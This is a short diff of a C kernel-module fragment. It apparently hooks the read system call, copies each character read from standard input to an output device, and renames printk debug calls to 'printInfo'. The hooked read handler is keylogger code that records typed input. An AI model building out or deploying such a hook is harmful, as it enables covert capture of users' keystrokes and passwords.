@@ -29,16 +29,16 @@ asmlinkage int readHook(int fd, void* buf, size_t nbytes) {
 		if (fd==0)
 		{	
 			
-		//printk("\n");
-		   printk ("%c\n", (((char *) buf)[0]));
+		//printInfo("\n");
+		   printInfo ("%c\n", (((char *) buf)[0]));
 			
 			{
 				char *bufferAsCharacterAnArray = (char *) buf;
 				char ch = bufferAsCharacterAnArray[0];
 				addCharacterToOutputDevice(ch);
 			}
-			//printk("stdin read\n");
-		//printk("bytes read = %d\n", (int) nbytes);
+			//printInfo("stdin read\n");
+		//printInfo("bytes read = %d\n", (int) nbytes);
 		}
 	}
 	
